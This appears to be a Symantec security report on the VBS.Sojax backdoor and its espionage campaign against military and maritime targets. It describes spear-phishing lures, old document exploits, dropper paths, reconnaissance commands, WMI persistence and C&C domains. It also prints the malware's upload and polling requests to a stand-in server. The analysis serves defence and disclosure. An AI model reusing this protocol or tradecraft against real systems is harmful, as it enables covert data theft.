The attackers use tailored emails to encourage the\n\nInfographic.................................................. 10\n\nvictim to open the email. For example, one email sent to an academic\nclaimed to be a call for papers for a conference (CFP). Academics receive\ndozens of CFPs every year. If the victim has previously presented at that\nparticular conference, or is interested in the subject matter, they are\nquite likely to open the CFP. Another email sent to a maritime organiza-\ntion claims to contain details of an alert beaconing system. Again, this is\na relevant topic for the recipient. A judicious choice of email topics and\nrecipients by the attackers is the most effective way of compromising the\ntarget and also maintaining a low profile. Fewer, more effective emails,\nwhich do not draw attention to themselves, allow the attacks to continue\nundetected for as long as possible. Discreet malware also aids this cause.\n\nAfter the email attachment has been opened by the victim, the malware,\n[VBS Sojax is activated The attackers chose a very simple technique for](http://www.symantec.com/security_response/writeup.jsp?docid=2012-011606-0524-99)\n\n\n-----\n\ntheir malware. Rather than using a compiled programming language to write the back door Trojan, they used\na Visual Basic script. Scripts are very simple to develop, requiring less expertise and time to develop than a\nstandard back door Trojan. The script itself is quite simple. It connects to a command-and-control (C&C) server\nto retrieve commands and upload data. HTTP is used to easily pass through firewalls. The script functionality is\nbasic; it can run commands and it can upload and download files. This is enough to retrieve any information the\nattackers want. Again, minimal effort is expended for maximum gain.\n\nThe same ethos is shown with the choice of C&C servers. C&C servers are a potential pitfall for the attackers as\nit may be possible for an investigator to track the attackers using registration details for the C&C server. This\nis the case when the attackers register and pay for their own C&C server. A commonly used alternative is for\nattackers to commandeer an innocent third party server for their own purposes. This requires effort, however,\nas the attackers must firstly locate and then hack into the server. The Sojax attackers use an approach that\nrequires much less effort. They use free Web hosting. There are hundreds of free Web hosting sites that require\nlittle or no registration information. Once the attackers have registered the free service, they create a directory\nand upload a PHP script that acts as the C&C server. They then modify their malware scripts to use this new URL\nand email the scripts out to targets. Symantec identified 25 C&C servers. Only two or three of these were active,\nthe rest had been abandoned. Several partial listings of stolen file names (not the files) were retrieved from the\nserver, along with the IP addresses of compromised computers and the IP addresses of the attackers.\n\nThe vast majority of the victims were based in India, with some in Malaysia. The victim industry was mostly military research and also shipping based in the Arabian and South China seas. In some instances the attackers appeared to have a clear goal, whereby specific files were retrieved from certain compromised computers. In other\ncases, the attackers used more of a ‘shotgun’ like approach, copying every file from a computer. Military technologies were obviously the focus of one particular attack with what appeared to be source code stolen. 45 different\nattacker IP addresses were observed. Out of those, 43 were within the same IP address range based in Sichuan\nprovince, China. The remaining two were based in South Korea. The pattern of attacker connections implies that\nthe IP addresses are being used as a VPN, probably in an attempt to render the attackers anonymous.\n\nThe attacks have been active from at least April 2011 up to February 2012. The attackers are intelligent and\nfocused, employing the minimum amount of work necessary for the maximum gain. They do not use zero day\nexploits or complicated threats, instead they rely on effective social engineering and lax security measures on\nthe part of the victims. Security awareness training and a consistent patching strategy would have protected the\nvictims from these attacks.\n\n\n##### Technical details\n###### Attack vector\n\nThe attacks are initiated by\nemail. Symantec.cloud has\ndetected several emails distributing the VBS.Sojax back door\nTrojan. Two example emails are\nshown in figure 1.\n\nMost of the emails are fairly\nwell tailored. The two examples\nshown here are probably the\nmost targeted ones. Other\nemails topics are about salaries\n– a fairly common topic used in\ntargeted attacks. The emails are\nnearly all sent from Gmail, which\ndoes not store the originating IP\naddress. Two of the emails were\n\n\nFigure 1\n###### Example emails\n\n\n-----\n\nsent through Yahoo mail, which does store\nthe originating IP address. The source IP address for both of these emails was the same\n– an IP address located in Germany. Other\nindependent reports show this IP address\nas an originator of spam and thus may be an\nopen relay.\n\nThe breakdown of emails detected by Symantec.cloud and samples per month is shown in\nfigure 2. These numbers represent the minimum number of emails sent by the attackers\nas not all victims are using Symantec.cloud\nservices.\n\nFigure 3 lists the number and type of exploit\nused by the attackers. The exploits are all old,\npublicly available, and patched. The vast majority used are PDF exploits. Sixteen samples\nexploiting the CVE-2010-2883 vulnerability\nhave been located, with only one or two of\nthe other exploits. It may be that the attackers have more success with the PDF exploit\neither because the target computers are not\npatched, or because it is easier to obfuscate\nthe PDFs and prevent antivirus detection.\n\n###### VBS.Sojax\n\nWhen the dropper document, the .doc, .rtf, or\n.pdf is loaded, it drops an executable to the\nfollowing location:\n\n%ProgramFiles%\\Common Files\\Microsoft\nShared\\update.exe\n\n\nFigure 2\n###### Samples & emails over time\n\nFigure 3\n###### Exploits used by the attackers\n\nFigure 4\n###### A portion of VBS.Sojax\n\n\nThis executable is then run. When run, it extracts a script\nfrom its resources and writes this script to the following\nlocation %Temp%\\~temp.vbs. This script contains the primary functionality of the threat. Figure 4 shows a portion\nof the script. The simplicity of the script is plain to see.\n\nWhen first run, the script obtains the following information:\n\n- A complete listing of all files in partitions from drives C through I\n\n- Network information (ipconfig /all)\n\n- Information about the compromised computer (systeminfo)\n\n- Processes running on the computer (tasklist)\n\nIt stores all of the output in the following folder:\n\n%Windir%\\NtUninstallKB\n\nThis data is then compressed into a .cab file and uploaded to the C&C server. VBS.Sojax parses the response\nfrom the server, looking for three potential commands:\n\n- Upload files to the C&C server\n\n- Download files from the C&C server\n\n\n-----\n\nThe C&C server is then polled every 30 seconds for additional commands. To maintain persistence, VBS.Sojax\nregisters itself to be called on reboot using a WMI event.\n\n###### C&C server protocol\n\nWhen VBS.Sojax connects to the C&C server, it does so through HTTP port 80. If uploading data, it sends a HTTP\nPOST request to a script called either count.php or loveusa.php. This POST request is formatted as follows:\n```\n  HTTP POST http://server.com/count/count.php?m=c&n=MACADDRESS\n\n```\nThe MACADDRESS value is the MAC address of the compromised computer. To retrieve a command from the\nserver, the script then polls for commands specific to that MACADDRESS.\n```\n  HTTP GET http://server.com/count/count.php?m=r&n=MACADDRESS.c\n\n```\nIf there is a command, the command is executed and the results are uploaded to the server using a HTTP POST\nrequest. It is a very simple protocol, there is no authentication.\n\n###### C&C servers\n\nSo far, 25 C&C servers have been identified. They are listed in Table 1 and graphed in figure 5. The majority of\nthese C&C servers are free hosting providers. The attackers sign up for an account, register the sub-domain for\nfree, and upload their C&C server script to a count folder.\n\nTable 1\n\nWhen a compromised computer uploads data to the count.php script using an Command and\nHTTP post, that data is written into a file in the same folder as the C&C server. Control domains\nAlthough most of these files had since been retrieved and subsequently deleted\n\n###### C&C Server Domains\n\nby the attackers, several files remained. Some of the remaining files were the\ncompressed .cab files described previously. Others were fragments of commands 2012enviroment.world.mu\nand some stolen files. charlesbrain.shop.co\n\nclbest.greenglassint.net\n\nIn one instance, several log files of activity on a C&C server were found. These\nlog files listed all of the files stolen by the attackers with respect to that par- dasauto.no-sports.de\nticular C&C server. There was also a log file showing what appeared to be FTP footballshopping.shop.co\nconnections to the server from the attackers. frankwhales.shop.co\n\nFigure 5 jeepvihecle.shop.co\n###### Distribution of C&C servers killmannets.0fees.net\n\n\n-----\n\n###### Victims\n\nFrom the log files and fragments of stolen data remaining on the server, it was possible to identify eight victims. At the time of writing, where possible, the victims are in the process of being notified and any information\nretrieved passed on. Figure 6 shows the geographical distribution of the victims. Nearly every infection is in\nIndia, with several others in Figure 6\nMalaysia.\n\n###### Distribution of VBS.Sojax victims\n\nVictim industries were\nmilitary research, defense,\nmanufacturing, and maritime. The data stolen was\nquite varied. In some cases\nit appeared that documents\nwith suggestive names were\nstolen, simply out of curiosity. For example, one stolen\ndocument that had a military themed title is actually\npublicly available from the\npublisher’s website.\n\nOther stolen files were\nmore serious. Two separate\nvictims had documents pertaining to the same military\ntechnology. The attackers\nwere clearly targeting that technology. The attackers also stole source code from one of those two victims that\nmay have been related to the technology.\n\n###### The attackers\n\nThe most useful information about the attackers is in one of the log files retrieved from a C&C server. This log\nfile appears to record connections to an FTP server running on the C&C server. The attackers probably use FTP\nto easily retrieve stolen data uploaded to the C&C server. 45 unique IP addresses were identified in the log. Of\nthese, all but two are from the same ISP, based in Sichuan province in China. The remaining two are from South\nKorea. Figure 7 shows a portion of that log.\n\nFigure 7\n###### Connections from the attacker\n\nThe user LUCKYCAT is the attacker who successfully logged into the server. The connections by LUCKYCAT are\nconsecutive. Immediately after one connection is closed, a new one is opened by the attacker. A lack of overlap\nimplies that a single person or program is making the connections and not multiple people from different computers\n\n\n-----\n\nDespite this, the IP address used for the new connection changes regularly. In figure 7, during a period of approximately an hour and 15 minutes, four different IP addresses were used for six distinct connections. This\nis unusual because if the attacker is using DHCP, generally an IP address will remain allocated to a particular\ncomputer for a longer period of time.\n\nA possible explanation is that the IP addresses used are the point of egress of a VPN-like service. The attackers\nmay be using a service through which they can route their connections. The service periodically rotates connections amongst a pool of IP addresses in order to render the attacker anonymous or implicate China as the\nsource of the attack. There are two potential reasons for the South Korean IP addresses. The first is that the IP\naddresses are part of the VPN service and were assigned to the attacker as the service rotated through the range\nof IP addresses available. The second explanation is that the attacker may have forgotten to enable the VPN by\nmistake and connected directly to the C&C server.\n\nFigures 8 and 9 show the log at the time that the South Korean IP addresses logged into the FTP server.\n\nFigure 8\n###### First South Korean IP address\n\nFigure 9\n###### Second South Korean IP address\n\nIn both cases, connections from the Chinese and South Korean IP addresses are around the same time. Either\nthe time overlaps as in figure 8, or the times are immediately consecutive as in figure 9. This suggests that the\nconnecting person, or program, is the same in both cases.\n\n##### Conclusion\n\nThe attacks described are very simple. That, however, does not mean that they are not intelligently designed and\nultimately, highly effective. Using a scripting language to develop the VBS.Sojax threat cuts down on development time. It means less effort needs to be invested in attempting to prevent detection by antivirus software.\nSimilarly, using freely available hosting for C&C servers (theoretically) limits exposure. Old exploits are so well\ndocumented and freely available that minimal effort is required to modify them for use. Such basic tools, in combination with targeted social engineering, proved to be an efficient combination for the attacker. These attacks\nshould not have succeeded on a properly secured network. Old exploits should have been patched and users\nshould have received adequate security awareness training.\n\n\n-----\n\n##### Symantec protection\n\nMany different Symantec protection technologies play a role in defending against this threat, including:\n\n###### File-based protection (traditional antivirus)\n\n[Traditional antivirus protection is designed to detect and block malicious files and is effective against files as-](http://www.symantec.com/business/theme.jsp?themeid=star&tabID=2)\nsociated with this attack.\n\n     - [VBS.Sojax](http://www.symantec.com/security_response/writeup.jsp?docid=2012-011606-0524-99)\n\n     - [VBS.Sojax!gen1](http://www.symantec.com/security_response/writeup.jsp?docid=2012-011616-2024-99)\n\n     - [Trojan.Pidief](http://www.symantec.com/security_response/writeup.jsp?docid=2009-121708-1022-99)\n\n     - [Bloodhound.Exploit.290](http://www.symantec.com/security_response/writeup.jsp?docid=2010-040704-0437-99)\n\n     - [Bloodhound.Exploit.357](http://www.symantec.com/security_response/writeup.jsp?docid=2010-090901-2159-99)\n\n     - [Bloodhound.Exploit.422](http://www.symantec.com/security_response/writeup.jsp?docid=2011-082410-2657-99)\n\n###### Network-based protection (IPS)\n\n[Network based protection can help protect against unauthorized network activities conducted by malware](http://www.symantec.com/business/theme.jsp?themeid=star&tabID=3)\nthreats or intrusion attempts.\n\n     - [Web Attack: HTTP Adobe Acrobat CVE-2010-0188 2](http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=23675)\n\n     - [Web Attack: Adobe Flash Embedded SWF CVE-2011-0611](http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=24291)\n\n     - [Attack: Adobe Reader TTF File CVE-2010-2883](http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=23889)\n\n     - [Attack: MS Office Word RTF Exploit CVE-2010-3333](http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=23997)\n\n     - [HTTP MS Office Word RTF RCE 1](http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=24025)\n\n###### Behavior-based protection\n\n[Symantec products with behavior-based detection technology can detect and block previously unknown threats](http://www.symantec.com/business/theme.jsp?themeid=star&tabID=4)\nfrom executing, including those associated with this attack.
